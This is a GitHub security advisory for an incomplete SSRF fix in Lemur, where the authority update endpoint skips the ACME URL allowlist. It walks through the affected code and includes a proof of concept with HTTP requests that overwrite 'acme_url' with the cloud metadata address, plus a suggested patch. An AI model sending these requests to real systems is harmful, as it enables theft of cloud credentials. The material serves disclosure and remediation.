# [H] Lemur: Incomplete fix for GHSA-v2wp-frmc-5q3v -- ACME authority update endpoint allows non-admin to replace `acme_url` with internal IP, bypassing allowlist

## Summary
Severity: High
Advisory: GHSA-v5rc-cpwc-cfpr
CVE: CVE-2026-71303
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-v5rc-cpwc-cfpr
Type: github-advisory

## Affected
- PyPI: `lemur` — affected >=0 <1.9.3

## Details
### Summary

The fix for GHSA-v2wp-frmc-5q3v added `_validate_acme_url()` to reject `acme_url` values not in `ACME_DIRECTORY_HOST_ALLOWLIST`, but the validation is only called at **authority creation time** (POST). The authority **update** endpoint (`PUT /api/1/authorities/<id>`) accepts and stores arbitrary `options` -- including a modified `acme_url` -- without invoking the allowlist check. Any user with an authority role (granted by an admin to allow issuing certificates via that authority) can therefore overwrite the stored `acme_url` with an internal IP or IMDS endpoint. The next certificate issuance via that authority causes Lemur's backend to fetch the attacker-controlled URL, achieving SSRF.

### Details

**Where the fix lives (POST path -- protected):**

`lemur/plugins/lemur_acme/plugin.py` lines 333-337 (ACMEIssuerPlugin.create_authority):
```python
for option in plugin_options:
    if option.get("name") == "certificate":
        acme_root = option.get("value")
    if option.get("name") == "acme_url":
        _validate_acme_url(option.get("value", ""))   # allowlist enforced
```

`_validate_acme_url` at line 35:
```python
def _validate_acme_url(url):
    """Reject acme_url values that are not in the configured allowlist.

    Called at authority creation time only -- existing authorities in the DB
    were already trusted when they were created and are not re-validated.
    """
    allowed_hosts = current_app.config.get(
        "ACME_DIRECTORY_HOST_ALLOWLIST",
        {"acme-v02.api.letsencrypt.org", ...},
    )
    parsed = urlparse(url)
    if parsed.scheme != "https" or parsed.hostname not in allowed_hosts:
        raise InvalidConfiguration(...)
```

**Where the gap is (PUT path -- unprotected):**

`lemur/authorities/views.py` lines 405-424 (`Authorities.put`):
```python
authority = service.get(authority_id)
roles = [x.name for x in authority.roles]
permission = AuthorityPermission(authority_id, roles)

if not permission.can() or not StrictRolePermission().can():
    return dict(message="You are not authorized to update this authority."), 403

return service.update(
    authority_id,
    owner=data["owner"],
    description=data["description"],
    active=data["active"],
    roles=data["roles"],
    options=data.get("options")        # stored verbatim -- no ACME URL check
)
```

`lemur/authorities/service.py` lines 28-46 (`update`):
```python
def update(authority_id, description, owner, active, roles, options=None):
    authority = get(authority_id)
    authority.roles = roles
    authority.active = active
    authority.description = description
    authority.owner = owner
    if options:
        authority.options = options    # written to DB with no _validate_acme_url call
    return database.update(authority)
```

**Where the SSRF sink is:**

`lemur/plugins/lemur_acme/acme_handlers.py` lines 157-188:
```python
for option in json.loads(authority.options):
    options[option["name"]] = option.get("value")
directory_url = options.get("acme_url", current_app.config.get("ACME_DIRECTORY_URL"))
...
directory = ClientV2.get_directory(directory_url, net)   # outbound HTTP to stored URL
```

With the default configuration (`LEMUR_STRICT_ROLE_ENFORCEMENT = False`, reverted in 1.9.2 per the GHSA-qcqw-jwxc-2hqg correction), `StrictRolePermission().can()` passes for any non-read-only user. Any user granted membership in an authority's role group by an admin can therefore call `PUT /api/1/authorities/<id>` to overwrite `acme_url` with an arbitrary URL. The allowlist enforced at creation is silently discarded.

### PoC

**Prerequisites:**
- Lemur 1.9.2, default config (`LEMUR_STRICT_ROLE_ENFORCEMENT` not set, defaults to `False`)
- Admin grants non-admin user membership in an ACME authority's role (normal operational step to allow certificate issuance)
- Attacker has a valid Lemur session token

**Step 1 -- Authenticate as the non-admin user (role: TestRootCA_operator):**

```
POST /api/1/auth/login HTTP/1.1
Host: lemur.example.com
Content-Type: application/json

{"username": "alice", "password": "..."}
```

Response (truncated):
```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

**Step 2 -- Confirm identity (non-admin, no global operator role):**

```
GET /api/1/auth/me HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Response:
```json
{"username": "alice", "id": 2, "roles": [{"name": "TestRootCA_operator"}]}
```

**Step 3 -- Overwrite acme_url with an internal IMDS endpoint via authority update:**

```
PUT /api/1/authorities/1 HTTP/1.1
Host: lemur.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "owner": "security@example.com",
  "description": "Let's Encrypt Production",
  "active": true,
  "roles": [{"id": 5}, {"id": 6}, {"id": 7}],
  "options": "[{\"name\": \"acme_url\", \"value\": \"http://169.254.169.254/latest/meta-data/\"}]"
}
```

Response (HTTP 200 -- no validation error):
```json
{
  "id": 1,
  "name": "TestRootCA",
  "description": "Let's Encrypt Production",
  "options": [{"name": "acme_url", "value": "http://169.254.169.254/latest/meta-data/"}],
  ...
}
```

**Live validation output (observed on Lemur 1.9.2, 2026-06-19):**

```
User: nonadvuln | ID: 2 | Roles: ['TestRootCA_operator']

PUT /api/1/authorities/1 -> HTTP 200
stored options: [{"name": "acme_url", "value": "http://169.254.169.254/latest/meta-data/"}]

DB confirm (psql):
SELECT options FROM authorities WHERE id=1;
"[{\"name\": \"acme_url\", \"value\": \"http://169.254.169.254/latest/meta-data/\"}]"
```

**Step 4 -- Trigger SSRF:**

Issue any certificate via authority 1 (using the same or any other user with certificate issuance rights). Lemur's celery worker calls `AcmeHandler.setup_acme_client()`, which executes:

```python
directory_url = options.get("acme_url", ...)  # reads stored malicious URL
directory = ClientV2.get_directory(directory_url, net)  # outbound request
```

The backend issues an HTTP GET to `http://169.254.169.254/latest/meta-data/`, achieving SSRF to the instance metadata service (or any other internal endpoint the Lemur host can reach).

**Suggested fix:**

Call `_validate_acme_url()` inside `service.update()` (or in `Authorities.put`) whenever the `options` field is provided and the authority uses an ACME-based issuer plugin:

```python
# in lemur/authorities/service.py  update()
if options:
    from lemur.plugins.lemur_acme.plugin import _validate_acme_url
    import json
    for opt in json.loads(options) if isinstance(options, str) else options:
        if opt.get("name") == "acme_url":
            _validate_acme_url(opt.get("value", ""))
    authority.options = options
```

### Impact

An authenticated Lemur user who has been granted membership in any ACME authority's role group can overwrite that authority's `acme_url` with an arbitrary URL, bypassing the `ACME_DIRECTORY_HOST_ALLOWLIST` enforced at creation time. On the next certificate issuance via that authority, Lemur's backend issues an outbound HTTP request to the attacker-controlled URL. In cloud-hosted deployments this allows reading the instance metadata service (AWS IMDSv1, GCP metadata server, Azure IMDS), potentially yielding IAM credentials or other sensitive instance data. In on-premises or private-cloud deployments this allows probing internal services that the Lemur server can reach but external callers cannot.

## References
- https://github.com/Netflix/lemur/security/advisories/GHSA-v5rc-cpwc-cfpr
- https://github.com/Netflix/lemur/commit/edca0390f930344d65ff4ca37a669c2320e3dfad
- https://github.com/Netflix/lemur
- https://github.com/Netflix/lemur/releases/tag/v1.9.3
